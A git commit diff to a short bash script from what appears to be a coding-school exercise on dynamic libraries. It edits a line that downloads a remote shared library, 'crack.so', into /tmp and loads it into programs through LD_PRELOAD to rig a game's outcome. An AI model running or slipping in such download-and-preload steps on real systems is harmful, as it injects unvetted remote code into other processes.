a1c1273f8ab9fb677062e69980a19a975b10151c
Steve <evilco30@gmail.com>
2023-04-19 08:29:36 -0700

    Upload

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P tmp/ https://github.com/Stariano/alx-low_level_programming/raw/main/0x18-dynamic_libraries/crack.so
+wget -O /tmp/crack.so https://github.com/Stariano/alx-low_level_programming/raw/main/0x18-dynamic_libraries/crack.so
 export LD_PRELOAD=/tmp/crack.so
